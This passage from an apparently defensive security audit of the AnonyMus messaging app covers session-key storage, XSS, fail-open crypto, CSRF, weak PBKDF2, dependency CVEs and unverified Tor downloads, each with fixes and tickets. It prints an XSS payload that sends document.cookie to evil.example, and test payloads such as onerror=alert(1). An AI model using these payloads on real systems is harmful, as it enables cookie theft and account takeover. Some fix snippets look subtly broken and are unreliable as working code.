The `db_key` must never leave the server process. Move to server-side session storage (Flask-Session) keyed by session ID; the cookie then carries only an opaque session ID, and the actual `db_key` lives in Redis (relay mode) or an in-memory dict (P2P mode, single-process).

```python
# transports/p2p/server.py (FIXED)
from flask_session import Session  # add Flask-Session to requirements.txt

# In create_app():
app.config['SESSION_TYPE'] = 'redis' if os.environ.get('REDIS_URL') else 'null'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = os.environ.get('DISABLE_SSL', 'false').lower() != 'true'
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=8)
Session(app)

# In /login handler (after password verification):
db_key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600_000)  # see HIGH-5
session['username'] = username
session['db_key_id'] = secrets.token_urlsafe(32)  # opaque handle, NOT the key itself
# Store db_key in a server-side dict keyed by db_key_id, with a TTL
_DB_KEY_CACHE[session['db_key_id']] = db_key
# Schedule expiry
threading.Timer(8 * 3600, lambda: _DB_KEY_CACHE.pop(session['db_key_id'], None)).start()

# In any route that needs to decrypt the DB:
def get_db_key() -> bytes:
    key_id = session.get('db_key_id')
    if not key_id:
        abort(401)
    key = _DB_KEY_CACHE.get(key_id)
    if key is None:
        abort(401, "Session expired — please log in again")
    return key
```

For relay mode (multi-worker), use Redis-backed Flask-Session so all workers share the session store. For P2P mode (single-process by design), the in-memory dict is sufficient.

#### Ticket-Ready Task

> **[ANONYMUS-002] Move `db_key` out of the Flask session cookie**
>
> **Acceptance criteria:**
> - `session['db_key']` is never set anywhere in the codebase.
> - `db_key` is stored server-side in `_DB_KEY_CACHE` (P2P) or Redis (relay), keyed by an opaque `db_key_id` that IS in the session.
> - `db_key` entries expire after 8 hours (matching `PERMANENT_SESSION_LIFETIME`).
> - `get_db_key()` helper replaces all direct `session['db_key']` access.
> - Integration test `tests/integration/test_p2p_db_key.py` asserts that the cookie payload (Base64-decoded) does not contain the `db_key` hex string.
> - `docs/FEATURES.md` updated to reflect that the cookie is opaque.
>
> **Effort:** 4 hours (code) + 2 hours (tests) + 1 hour (docs) = **7 hours**
> **Dependencies:** Add `flask-session` and (relay mode) `redis` to `requirements.txt`.
> **Priority:** P0 — block all releases until fixed.

---

## 6. Part II — High Findings (P1)

High findings must be fixed in weeks 2-4. Each is a serious vulnerability or correctness bug that materially weakens the security posture or violates a README claim.

### HIGH-1 — DOM-Based XSS in P2P Contact Acceptance

**Severity:** High (CVSS 8.1)
**CWE:** CWE-79 (Cross-site Scripting)
**OWASP:** A03:2021 Injection
**Files:** `web/static/chat.js:434` (sink); `transports/p2p/server.py:475` (no server-side validation)

#### Description

When a P2P contact request is received, the web client renders the requester's `nickname` using `innerHTML`:

```javascript
// web/static/chat.js:434 (current — VULNERABLE)
pendingRequestText.innerHTML =
  `<strong>${contact.nickname}</strong> (${contact.onion_address})…`;
```

The `nickname` field is stored verbatim from the requester (the server only does `.strip()`), so an attacker can set their nickname to `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`. When the victim opens the contact-request panel, the payload executes in the victim's browser, exfiltrating the session cookie (which, pre-CRIT-2 fix, contains `db_key` — full compromise) and any other sensitive data accessible to JS.

The `onion_address` field is regex-validated server-side and is safe. All other DOM insertions in `chat.js` (e.g., `addMessageLine`, `addStatusLine`) correctly use `textContent` — this is the only `innerHTML` sink.

#### Fix

Two layers: server-side validation (defense in depth) and a safe DOM construction on the client.

**Server-side (validate nickname on contact add):**

```python
# transports/p2p/server.py (FIXED — in /api/contacts/add handler)
import re
NICKNAME_PATTERN = re.compile(r'^[\p{L}\p{N} \-_.]{1,64}$')  # Unicode letters/digits, 1-64 chars
MAX_NICKNAME_LEN = 64

def validate_nickname(raw: str) -> str:
    nick = (raw or '').strip()
    if not nick:
        raise ValueError("Nickname is required")
    if len(nick) > MAX_NICKNAME_LEN:
        raise ValueError(f"Nickname exceeds {MAX_NICKNAME_LEN} characters")
    if not NICKNAME_PATTERN.match(nick):
        raise ValueError("Nickname contains invalid characters")
    return nick
```

**Client-side (use `textContent`, never `innerHTML` for untrusted data):**

```javascript
// web/static/chat.js:434 (FIXED)
pendingRequestText.replaceChildren();  // clear
const strong = document.createElement('strong');
strong.textContent = contact.nickname;  // safe
pendingRequestText.appendChild(strong);
pendingRequestText.appendChild(
  document.createTextNode(` (${contact.onion_address})…`)
);
```

#### Ticket-Ready Task

> **[ANONYMUS-003] Eliminate XSS in P2P contact acceptance**
>
> **Acceptance criteria:**
> - `web/static/chat.js` contains zero `innerHTML` assignments for untrusted data (audit with `rg 'innerHTML' web/static/`).
> - `transports/p2p/server.py` `validate_nickname()` enforces length + character class on every contact add.
> - Unit test `tests/unit/p2p/test_nickname_validation.py` rejects payloads: `<img src=x onerror=alert(1)>`, `"><script>`, `javascript:alert(1)`, 65-char string, empty string.
> - E2E test `tests/integration/test_xss_protection.py` sends a malicious nickname and asserts the rendered DOM does not contain an `<img>` or `<script>` child.
>
> **Effort:** 2 hours
> **Priority:** P1

---

### HIGH-2 — `encrypt_secret()` Silently Returns Plaintext on AES-GCM Failure

**Severity:** High (CVSS 8.1)
**CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions)
**OWASP:** A07:2021 Identification and Authentication Failures
**Files:** `core/crypto.py:25-27`; `transports/p2p/database.py:59-61`

#### Description

The `encrypt_secret()` helper catches any `Exception` during AES-GCM encryption and returns the **plaintext** Base64-encoded as if it were ciphertext:

```python
# core/crypto.py:25-27 (current — VULNERABLE)
def encrypt_secret(plaintext_b64: str, key: bytes) -> str:
    try:
        iv = os.urandom(12)
        ct = AESGCM(key).encrypt(iv, plaintext_b64.encode(), None)
        return base64.b64encode(iv + ct).decode()
    except Exception:
        return plaintext_b64  # SILENTLY RETURNS PLAINTEXT
```

If AES-GCM ever fails (misconfigured key, transient memory error, FIPS mode disabling AES-NI), the shared secret is written to `contacts.shared_secret` **unencrypted**. The `decrypt_secret()` counterpart has the same flaw — on decryption failure, it returns the raw ciphertext as if it were plaintext (line 87-88), which then gets forwarded to the client. The intended behavior (fail-closed) is inverted to fail-open.

#### Fix

```python
# core/crypto.py (FIXED — fail closed, never return plaintext)
def encrypt_secret(plaintext_b64: str, key: bytes) -> str:
    """Encrypt a Base64-encoded secret with AES-256-GCM. Raises on failure."""
    iv = os.urandom(12)
    ct = AESGCM(key).encrypt(iv, plaintext_b64.encode(), None)
    return base64.b64encode(iv + ct).decode()

def decrypt_secret(ciphertext_b64: str, key: bytes) -> str:
    """Decrypt a Base64-encoded AES-256-GCM secret. Raises on failure."""
    raw = base64.b64decode(ciphertext_b64)
    iv, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(iv, ct, None).decode()

# transports/p2p/database.py (FIXED — let exceptions propagate)
def save_secret(self, peer_onion: str, shared_secret_b64: str) -> None:
    encrypted = encrypt_secret(shared_secret_b64, self._db_key)  # may raise
    with self._get_connection() as conn:
        conn.execute(
            "UPDATE contacts SET shared_secret = ? WHERE onion_address = ?",
            (encrypted, peer_onion),
        )
        conn.commit()
```

Add a startup self-test that encrypts + decrypts a known string and refuses to boot if either fails.

#### Ticket-Ready Task

> **[ANONYMUS-004] Make `encrypt_secret` / `decrypt_secret` fail-closed**
>
> **Acceptance criteria:**
> - Neither function catches `Exception`; both let errors propagate.
> - `save_secret()` callers handle `CryptoError` and return a 500 to the client (never silently store plaintext).
> - Unit test `tests/unit/core/test_crypto.py` asserts that `encrypt_secret` raises on: `None` key, wrong-length key, `None` plaintext, non-Base64 plaintext.
> - Startup self-test in `create_app()` logs "Crypto self-test passed" on success, panics on failure.
>
> **Effort:** 2 hours
> **Priority:** P1

---

### HIGH-3 — No CSRF Protection on Any POST Endpoint

**Severity:** High (CVSS 8.0)
**CWE:** CWE-352 (Cross-Site Request Forgery)
**OWASP:** A01:2021 Broken Access Control
**Files:** `transports/relay/server.py:62-68`; `transports/p2p/server.py:74-80`

#### Description

No POST endpoint (`/login`, `/register`, `/logout`, `/api/contacts/*`, `/api/messages/send`, `/api/reset-data`, `/api/mode`) uses CSRF tokens. The only mitigation is `SESSION_COOKIE_SAMESITE='Strict'`, which blocks classic cross-site POSTs but does **not** protect against: same-site subdomain attacks (if any subdomain has an XSS), active attackers who can place forms on the same origin, or browsers that ignore `SameSite` (older Safari, some embedded WebViews). Combined with MED-11 (`/api/reset-data` wipes the DB on a single POST), an attacker who can trick the victim's browser into POSTing to `/api/reset-data` causes **irreversible data loss**.

#### Fix

Add `flask-wtf` and enable `CSRFProtect` globally. For JSON-only APIs, use the double-submit cookie pattern (CSRF token in a cookie + mirrored in a custom header `X-CSRF-Token`, validated server-side).

```python
# transports/relay/server.py (FIXED)
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)
app.config['WTF_CSRF_TIME_LIMIT'] = 3600  # 1 hour
app.config['WTF_CSRF_SSL_STRICT'] = not app.debug

# For JSON API endpoints, exempt the WS connections but keep CSRF on HTTP POST:
@app.before_request
def csrf_exempt_ws():
    if request.path.startswith('/socket.io/'):
        csrf.exempt(g)
```

In the web client, fetch the CSRF token from a meta tag and include it on every fetch:

```javascript
// web/static/chat.js (FIXED — at top)
const CSRF_TOKEN = document.querySelector('meta[name="csrf-token"]')?.content;
async function apiPost(url, body) {
  const r = await fetch(url, {
    method: 'POST',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': CSRF_TOKEN,
    },
    body: JSON.stringify(body),
  });
  return r;
}
```

In templates, add the meta tag and render the token:

```html
<!-- web/templates/chat.html (FIXED — in <head>) -->
<meta name="csrf-token" content="{{ csrf_token() }}">
```

#### Ticket-Ready Task

> **[ANONYMUS-005] Add CSRF protection to all POST endpoints**
>
> **Acceptance criteria:**
> - `flask-wtf` added to `requirements.txt`.
> - `CSRFProtect(app)` enabled in both transports.
> - Every HTML template includes `<meta name="csrf-token" content="{{ csrf_token() }}">`.
> - Every `fetch()` in `web/static/*.js` sends `X-CSRF-Token` header.
> - Integration test `tests/integration/test_csrf.py` asserts that POST without the token returns 400, and POST with the correct token succeeds.
> - `/api/reset-data` additionally requires a confirmation token (e.g., re-enter password) beyond CSRF.
>
> **Effort:** 4 hours
> **Priority:** P1

---

### HIGH-4 — `/api/mode` Unauthenticated

**Severity:** High (CVSS 8.6)
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**OWASP:** A01:2021 Broken Access Control
**File:** `server.py:17-42`

#### Description

The WSGI dispatcher exposes `/api/mode` as a POST endpoint that flips the active transport between `relay` and `p2p`. It has **no authentication** — any client that can reach the server can swap the mode. Combined with HIGH-11 (`handoff()` is a no-op), a single unauthenticated POST causes: (a) all in-flight WS connections drop, (b) `queue_owners` and `socket_connect_times` dicts retain stale data (the mode-switch code does not zero them), (c) the next request is routed to a different Flask app that may have a different session layout.

```python
# server.py:17-42 (current — VULNERABLE)
@app.route('/api/mode', methods=['POST'])
def set_mode():
    data = request.get_json() or {}
    new_mode = data.get('mode')
    if new_mode not in ('relay', 'p2p'):
        return jsonify({'error': 'invalid mode'}), 400
    registry.switch_mode(new_mode)  # NO AUTH CHECK
    return jsonify({'mode': new_mode})
```

#### Fix

Either disable `/api/mode` in production (mode is set at startup via `ANONYMUS_MODE` env var) or require an admin password set via env var.

```python
# server.py (FIXED)
import hmac
import os

ADMIN_PASSWORD = os.environ.get('ANONYMUS_ADMIN_PASSWORD')
if not ADMIN_PASSWORD:
    app.logger.warning("ANONYMUS_ADMIN_PASSWORD not set — /api/mode is disabled")

@app.route('/api/mode', methods=['POST'])
def set_mode():
    if not ADMIN_PASSWORD:
        return jsonify({'error': '/api/mode disabled (set ANONYMUS_ADMIN_PASSWORD to enable)'}), 403
    provided = request.headers.get('X-Admin-Password', '')
    if not hmac.compare_digest(provided, ADMIN_PASSWORD):
        app.logger.warning("Failed /api/mode auth attempt from %s", request.remote_addr)
        return jsonify({'error': 'forbidden'}), 403
    data = request.get_json() or {}
    new_mode = data.get('mode')
    if new_mode not in ('relay', 'p2p'):
        return jsonify({'error': 'invalid mode'}), 400
    registry.switch_mode(new_mode)
    app.logger.info("Mode switched to %s by %s", new_mode, request.remote_addr)
    return jsonify({'mode': new_mode})
```

#### Ticket-Ready Task

> **[ANONYMUS-006] Authenticate `/api/mode`**
>
> **Acceptance criteria:**
> - `/api/mode` returns 403 if `ANONYMUS_ADMIN_PASSWORD` is unset.
> - `/api/mode` returns 403 on wrong password (constant-time comparison).
> - Successful mode switch is logged with the requester's IP.
> - Rate-limited to 5 attempts/minute per IP (defense against brute force).
> - `docs/SETUP.md` documents the new env var.
>
> **Effort:** 1.5 hours
> **Priority:** P1

---

### HIGH-5 — Fixed Salt + 10,000 PBKDF2 Iterations for DB Key

**Severity:** High (CVSS 7.5)
**CWE:** CWE-916 (Use of Password Hash With Insufficient Cost)
**OWASP:** A02:2021 Cryptographic Failures
**Files:** `core/crypto.py:6-11`; `transports/p2p/server.py:245`

#### Description

The AES-256-GCM key for `local_node.db` is derived from the user's password via PBKDF2-HMAC-SHA256 with a **hardcoded salt** (`b'salt_for_db_key_anonymus'`) and only **10,000 iterations** — identical across every install. The hardcoded salt defeats rainbow-table resistance (an attacker can precompute a single rainbow table covering common passwords and use it against every AnonyMus install). The iteration count is 60× below OWASP's 2023 recommendation of ≥600,000 for PBKDF2-SHA256.

```python
# core/crypto.py:6-11 (current — VULNERABLE)
FIXED_SALT = b'salt_for_db_key_anonymus'
ITERATIONS = 10_000

def derive_db_key(password: str) -> bytes:
    return hashlib.pbkdf2_hmac('sha256', password.encode(), FIXED_SALT, ITERATIONS)
```

#### Fix

Use a per-install random salt (generated on first run, stored in a separate `config` table row), and bump iterations to 600,000 (≈0.5s on a 2024 laptop — acceptable for a one-time login).

```python
# core/crypto.py (FIXED)
import os, hashlib, secrets

ITERATIONS = 600_000  # OWASP 2023 minimum for PBKDF2-SHA256
KEY_LEN = 32          # AES-256

def derive_db_key(password: str, salt: bytes) -> bytes:
    if len(salt) < 16:
        raise ValueError("Salt must be ≥16 bytes")
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, ITERATIONS, dklen=KEY_LEN)

def generate_salt() -> bytes:
    return secrets.token_bytes(16)

# transports/p2p/server.py (FIXED — store the salt in the config table)
def get_or_create_salt(conn) -> bytes:
    row = conn.execute("SELECT value FROM config WHERE key = 'db_salt'").fetchone()
    if row:
        return bytes.fromhex(row[0])
    salt = generate_salt()
    conn.execute("INSERT INTO config (key, value) VALUES ('db_salt', ?)", (salt.hex(),))
    conn.commit()
    return salt
```

For backward compatibility, on first login after the upgrade, if no `db_salt` row exists, derive the key with the old (fixed salt + 10k iter) parameters, decrypt the DB, re-encrypt with the new parameters, write the new salt, and atomically swap. This is a one-time migration.

#### Ticket-Ready Task

> **[ANONYMUS-007] Strengthen PBKDF2 parameters and use per-install salt**
>
> **Acceptance criteria:**
> - `ITERATIONS` is 600,000 (or higher; benchmark on a low-end Android device first).
> - Salt is 16+ bytes of `secrets.token_bytes`, stored in the `config` table under key `db_salt`.
> - One-time migration path: existing DBs are re-keyed on first login post-upgrade.
> - Benchmark test `tests/perf/test_pbkdf2.py` asserts derivation completes in <2s on CI hardware.
> - `docs/FEATURES.md` updated to reflect the new parameters.
>
> **Effort:** 4 hours (including migration) + 2 hours (tests) = **6 hours**
> **Priority:** P1

---

### HIGH-6 — Self-Signed TLS Cert Private Key Written to Disk Unencrypted

**Severity:** High (CVSS 7.5)
**CWE:** CWE-311 (Missing Encryption of Sensitive Data)
**OWASP:** A02:2021 Cryptographic Failures
**File:** `transports/relay/server.py:681-686`

#### Description

In relay mode with `DISABLE_SSL=False`, the server generates a self-signed RSA-2048 cert at boot and writes both `cert.pem` and `key.pem` to the transport directory using `serialization.NoEncryption()` and default filesystem permissions (typically 0644 on Linux, world-readable). Any local user on the relay host can read the private key and impersonate the relay.

```python
# transports/relay/server.py:681-686 (current — VULNERABLE)
with open('cert.pem', 'wb') as f:
    f.write(cert_pem)
with open('key.pem', 'wb') as f:
    f.write(key_pem)  # NoEncryption(), default perms
```

#### Fix

Two layers: (1) write the key file with mode 0600 and ownership restricted to the running user; (2) prefer a reverse proxy (Caddy or Traefik) with auto-Let's-Encrypt for production, and document `DISABLE_SSL=True` as the production default.

```python
# transports/relay/server.py (FIXED)
import os

KEY_PATH = 'key.pem'
CERT_PATH = 'cert.pem'

# Write key with restrictive perms BEFORE writing content
fd = os.open(KEY_PATH, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
with os.fdopen(fd, 'wb') as f:
    f.write(key_pem)
os.chmod(KEY_PATH, 0o600)

fd = os.open(CERT_PATH, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o644)
with os.fdopen(fd, 'wb') as f:
    f.write(cert_pem)

app.logger.info("Self-signed cert written to %s (perms 0600) and %s (perms 0o644)",
                KEY_PATH, CERT_PATH)
app.logger.warning("For production, set DISABLE_SSL=True and use Caddy/Traefik for TLS termination")
```

For production, update `docker-compose.yml` to include a Caddy service that auto-provisions Let's Encrypt certs:

```yaml
# build/docker-compose.yml (FIXED — add Caddy)
services:
  caddy:
    image: caddy:2
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile:ro
      - caddy_data:/data
    depends_on:
      - web
  web:
    environment:
      - DISABLE_SSL=True  # Caddy terminates TLS

volumes:
  caddy_data:
```

```
# build/Caddyfile
anonymus.example.com {
    reverse_proxy web:5000
    encode gzip
    header {
        Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        X-Content-Type-Options nosniff
        X-Frame-Options DENY
        Referrer-Policy no-referrer
    }
}
```

#### Ticket-Ready Task

> **[ANONYMUS-008] Protect TLS cert private key + add Caddy reverse proxy**
>
> **Acceptance criteria:**
> - `key.pem` is written with mode 0600 (verified by `tests/unit/relay/test_cert_perms.py`).
> - `docker-compose.yml` includes a Caddy service with auto-TLS.
> - `DISABLE_SSL=True` is the documented production default.
> - `docs/SETUP.md` includes a "Production deployment with Caddy" section.
>
> **Effort:** 3 hours
> **Priority:** P1

---

### HIGH-7 — No DB Migrations Framework

**Severity:** High (CVSS 7.1)
**CWE:** CWE-1047 (Modules with Insufficient Code Coverage)
**OWASP:** A06:2021 Vulnerable and Outdated Components
**Files:** (whole repo — no Alembic, no Flask-Migrate)

#### Description

The database schema is created with `CREATE TABLE IF NOT EXISTS`. This means: (a) any future column addition is silently ignored on existing installs (the table already exists, so the `CREATE` is a no-op), (b) there is no way to roll back a bad migration, (c) there is no version tracking — two installs can be on different implicit "versions" with no way to detect the drift. SimpleX, by contrast, ships 95 SQLite migrations + 29 Postgres migrations, each as a single module, with the schema SQL auto-regenerated by the test suite to catch drift.

#### Fix

Adopt Alembic (or Flask-Migrate, which wraps Alembic). Follow the SimpleX pattern: one migration per file, named `M{YYYYMMDD}_{description}.py`, and a test that regenerates the canonical schema SQL from a fresh migration run and diffs it against the checked-in `schema.sql`.

```bash
# Install
pip install alembic flask-migrate

# Initialize
flask db init

# Create first migration (baseline — capture the current schema)
flask db migrate -m "baseline schema"
flask db upgrade
```

```python
# migrations/env.py (standard Alembic env, with our config)
# Alembic reads DATABASE_URL from .env
```

```python
# tests/unit/test_schema_drift.py (FIXED — catch migration drift)
def test_schema_matches_migrations():
    """Apply all migrations to a fresh DB, dump schema, diff against schema.sql."""
    fresh = create_fresh_db_via_migrations()
    actual = dump_schema(fresh)
    expected = (Path(__file__).parent.parent.parent / "schema.sql").read_text()
    assert actual == expected, "schema.sql is out of date — run `make schema`"
```

#### Ticket-Ready Task

> **[ANONYMUS-009] Add Alembic migrations + schema drift test**
>
> **Acceptance criteria:**
> - `migrations/` directory with Alembic env and a baseline migration.
> - `schema.sql` checked in, regenerated by `make schema`.
> - `tests/unit/test_schema_drift.py` fails if `schema.sql` is stale.
> - `docs/SETUP.md` documents `flask db upgrade` as part of deployment.
> - Existing installs can be upgraded by running `flask db upgrade` (no manual SQL).
>
> **Effort:** 6 hours (initial setup + baseline migration + drift test)
> **Priority:** P1

---

### HIGH-8 & HIGH-9 — Outdated Dependencies with Known CVEs

**Severity:** High (CVSS 7.5 each)
**CWE:** CWE-444 (HTTP Smuggling); CWE-295 (Cert Verification Bypass)
**OWASP:** A06:2021 Vulnerable and Outdated Components
**File:** `requirements.txt`

#### Description

Two pinned dependencies have known CVEs:

- `gunicorn==22.0.0` — CVE-2024-1135: HTTP request smuggling via inconsistent parsing of `Transfer-Encoding` and `Content-Length` headers between Gunicorn and a fronting reverse proxy. An attacker can smuggle a second request, bypassing access controls. Fixed in 23.0.0.
- `requests==2.31.0` — CVE-2024-35195: When using `verify=False` on a session, subsequent requests on that session also skip verification even if `verify=True` is passed per-request. Fixed in 2.32.0.

Neither is currently exploited in the AnonyMus codebase (the relay doesn't front a proxy that would smuggle, and `requests` is only used for Tor egress with `verify=True` by default), but the CVEs are public and the upgrades are trivial.

#### Fix

Bump the pins and add `pip-audit` to CI (see Section 11):

```diff
# requirements.txt (FIXED)
- gunicorn==22.0.0
+ gunicorn==23.0.0
- requests[socks]==2.31.0
+ requests[socks]==2.32.3
```

Add `pip-audit` and `safety` as dev dependencies, and a CI job (Section 11) that fails the build on any new CVE.

#### Ticket-Ready Task

> **[ANONYMUS-010] Bump gunicorn + requests; add pip-audit to CI**
>
> **Acceptance criteria:**
> - `requirements.txt` pins `gunicorn==23.0.0` and `requests[socks]==2.32.3`.
> - `pip-audit` runs in CI (Section 11) and fails on any High/Critical CVE.
> - `pip-audit` is added to `requirements-dev.txt`.
> - Smoke test: `gunicorn --version` returns 23.0.0; `requests.__version__` returns 2.32.3.
>
> **Effort:** 30 minutes
> **Priority:** P1

---

### HIGH-10 — No Input Validation on P2P Message Fields

**Severity:** High (CVSS 7.5)
**CWE:** CWE-20 (Improper Input Validation)
**OWASP:** A03:2021 Injection
**File:** `transports/p2p/server.py:533-568`

#### Description

The `/p2p/message` endpoint accepts `iv`, `ciphertext`, `seq`, and `timestamp` from any peer with an accepted contact, with no length cap (beyond the global 1 MB `MAX_CONTENT_LENGTH`), no type check, and no range check. `save_message()` then calls `int(timestamp)` — a non-numeric `timestamp` raises `ValueError` and 500s the server. A malicious peer can crash the recipient's P2P server by sending `{"timestamp": "not-a-number", ...}`.

#### Fix

Add a `marshmallow` (or `pydantic`) schema for every P2P endpoint, validate before any DB write, and return 400 (not 500) on invalid input.

```python
# transports/p2p/server.py (FIXED)
from marshmallow import Schema, fields, validate

class P2PMessageSchema(Schema):
    iv = fields.String(required=True, validate=validate.Length(equal=24))  # 12 bytes B64
    ciphertext = fields.String(required=True, validate=validate.Length(max=1_400_000))  # 1MB B64
    seq = fields.Integer(required=True, validate=validate.Range(min=0, max=2**31 - 1))
    timestamp = fields.Integer(required=True, validate=validate.Range(min=0, max=2**31 - 1))

@app.route('/p2p/message', methods=['POST'])
def p2p_message():
    try:
        data = P2PMessageSchema().load(request.get_json() or {})
    except ValidationError as e:
        return jsonify({'error': 'invalid payload', 'details': e.messages}), 400
    # ... proceed with save_message
```

#### Ticket-Ready Task

> **[ANONYMUS-011] Add marshmallow schemas to all P2P endpoints**
>
> **Acceptance criteria:**
> - Every `/p2p/*` and `/api/*` endpoint has a marshmallow schema.
> - Invalid payloads return 400 with a structured error body, never 500.
> - Fuzz test `tests/fuzz/test_p2p_endpoints.py` (using `atheris`) sends 10,000 random payloads and asserts no 500.
> - `marshmallow` added to `requirements.txt`.
>
> **Effort:** 4 hours
> **Priority:** P1

---

### HIGH-11 — `handoff()` Is a No-Op; Mode Switching Loses Sessions

**Severity:** High (CVSS 7.1)
**CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions)
**OWASP:** A07:2021 Identification and Authentication Failures
**Files:** `transports/relay/adapter.py`; `transports/p2p/adapter.py`

#### Description

Both `RelayTransport.handoff()` and `P2PTransport.handoff()` are `pass`. The README claims a "graceful session state transfer" during mode switching — this is false. When `/api/mode` is invoked, the dispatcher calls `handoff → stop → start`, but `handoff` does nothing, so all in-memory state (`socket_connect_times`, `queue_owners`, in-flight WS messages) is lost. Users experience a hard disconnect and must re-login.

#### Fix

Either implement real handoff (persist session state to Redis before stopping, restore after starting) or remove the claim from the README and document mode-switching as a "restart with brief downtime" operation.

**Recommended (simple, honest):** Remove `handoff()` from the ABC, document mode-switching as a server restart, and require users to re-authenticate. Persist active queue ownership to Redis (relay mode) so messages in flight are not lost — they are re-delivered when the recipient reconnects.

```python
# core/interfaces.py (FIXED — remove handoff from ABC)
class TransportProvider(ABC):
    @abstractmethod
    def start(self) -> None: ...
    @abstractmethod
    def stop(self) -> None: ...
    @abstractmethod
    def is_running(self) -> bool: ...
    # handoff() removed — mode switch is a restart
```

```diff
# README.md (FIXED)
- Mode switching uses a graceful handoff procedure, copying session parameters...
+ Mode switching is a server restart. Active WebSocket connections drop and
+ users must re-authenticate. In-flight messages are re-delivered when the
+ recipient reconnects (relay mode, Redis-backed).
```

#### Ticket-Ready Task

> **[ANONYMUS-012] Remove `handoff()` or implement it honestly**
>
> **Acceptance criteria:**
> - `handoff()` removed from `TransportProvider` ABC and both implementations.
> - README updated to describe mode-switch as a restart.
> - Integration test `tests/integration/test_mode_switch.py` verifies that mode switch drops WS connections, that queue ownership is persisted to Redis (relay mode), and that messages sent during the switch are re-delivered on reconnect.
>
> **Effort:** 6 hours
> **Priority:** P1

---

### HIGH-12 — No Test Coverage for Critical Paths

**Severity:** High (CVSS 7.1)
**CWE:** CWE-284 (Improper Access Control)
**Files:** `tests/`

#### Description

The current test suite contains 4 Python files + 1 JS file + 1 Kotlin file, testing only `register_user`/`login_user` and a timing-oracle heuristic. **Zero coverage** for: Flask routes, Socket.IO handlers, rate limiter, security headers, crypto helpers (via the actual server), Tor manager, the WSGI dispatcher, mode switching, error paths, the `RedactingFilter`, or end-to-end encrypted message exchange. SimpleX, by contrast, ships extensive Hspec-based integration tests for direct chat, groups, files, profiles, forward, chat relays, local, WebRTC, remote, member relations, operators, message batching, and schema drift — plus cross-platform KMP tests and instrumented Android tests.

#### Fix

See Section 12 (Testing Strategy) for the full plan. Headline targets: 90% line coverage on `core/`, 80% on `transports/`, 70% on `web/static/` JS, 70% on Android. Add at minimum: an E2E test that exchanges an encrypted message through the relay; an E2E test that exchanges one through Tor (with a mocked onion address); a fuzz test for every `/p2p/*` endpoint; a property-based test for the ratchet (using `hypothesis`); and a schema drift test (per HIGH-7).

#### Ticket-Ready Task

> **[ANONYMUS-013] Achieve 80% line coverage on `core/` and `transports/`**
>
> **Acceptance criteria:**
> - `pytest-cov` configured; `pytest --cov=core --cov=transports --cov-fail-under=80` passes in CI.
> - E2E tests for relay and P2P message exchange.
> - Fuzz tests for `/p2p/*` endpoints (10,000 iterations each).
> - Property-based test for the ratchet (`hypothesis`).
> - Schema drift test (per HIGH-7).
> - Coverage badge in README.
>
> **Effort:** 5 days (concentrated sprint)
> **Priority:** P1

---

### HIGH-13 — Tor Binary Downloaded Without GPG Verification

**Severity:** High (CVSS 7.7)
**CWE:** CWE-494 (Download of Code Without Integrity Check)
**OWASP:** A08:2021 Software and Data Integrity Failures
**File:** `transports/p2p/tor_manager.py:140-178`

#### Description

The Tor Expert Bundle is downloaded from `dist.torproject.org` over HTTPS, but only path-traversal sanitization is applied to the archive. The Tor Project publishes `.asc` GPG signatures for every release, signed by the Tor Project signing key (fingerprint `EF6E 286D DA85 EA2A 4BA7  DE68 4E2C 6E87 9329 8290`). Without verifying the signature, a compromised CDN mirror, a malicious exit node (if HTTPS is somehow downgraded), or a supply-chain attack on `dist.torproject.org` itself could ship a backdoored Tor binary that exfiltrates the user's onion private key.

#### Fix

Download the `.asc` signature alongside the archive, import the Tor Project signing key, and verify the signature before extracting.

```python
# transports/p2p/tor_manager.py (FIXED)
import gnupg  # python-gnupg
import requests
from pathlib import Path

TOR_SIGNING_KEY_FINGERPRINT = "EF6E286DDA85EA2A4BA7DE684E2C6E8793298290"
TOR_SIGNING_KEY_URL = "https://openpgpkey.torproject.org/.well-known/openpgpkey/torproject.org/hu/..."

def download_and_verify_tor(version: str, dest: Path) -> Path:
    base = f"https://dist.torproject.org/torbrowser/{version}/"
    archive_name = f"tor-expert-bundle-{version}-windows-x86_64.tar.gz"
    archive_url = base + archive_name
    sig_url = archive_url + ".asc"

    archive_path = dest / archive_name
    sig_path = dest / (archive_name + ".asc")

    # Download both
    archive_path.write_bytes(requests.get(archive_url, timeout=60).content)
    sig_path.write_bytes(requests.get(sig_url, timeout=60).content)

    # Verify signature
    gpg = gnupg.GPG(gnupghome=str(dest / ".gnupg"))
    gpg.recv_keys("keys.openpgp.org", TOR_SIGNING_KEY_FINGERPRINT)
    verified = gpg.verify_file(str(sig_path), str(archive_path))
    if not verified:
        raise RuntimeError(f"Tor archive signature verification FAILED — refusing to extract")
    if verified.pubkey_fingerprint != TOR_SIGNING_KEY_FINGERPRINT:
        raise RuntimeError(f"Tor archive signed by unexpected key: {verified.pubkey_fingerprint}")
    app.logger.info("Tor archive signature verified (key %s)", verified.pubkey_fingerprint)
    return archive_path
```

#### Ticket-Ready Task

> **[ANONYMUS-014] GPG-verify the Tor archive download**
>
> **Acceptance criteria:**
> - `tor_manager.py` downloads both the archive and the `.asc` signature.
> - Signature is verified against the Tor Project signing key (fingerprint pinned).
> - Extraction aborts on verification failure.
> - Unit test `tests/unit/p2p/test_tor_verify.py` uses a test keypair to verify the happy path and the tampered-archive rejection.
> - `python-gnupg` added to `requirements.txt`.
>
> **Effort:** 4 hours
> **Priority:** P1

---

### HIGH-14 — No Session Expiry on Flask Cookie

**Severity:** High (CVSS 7.5)
**CWE:** CWE-613 (Insufficient Session Expiration)
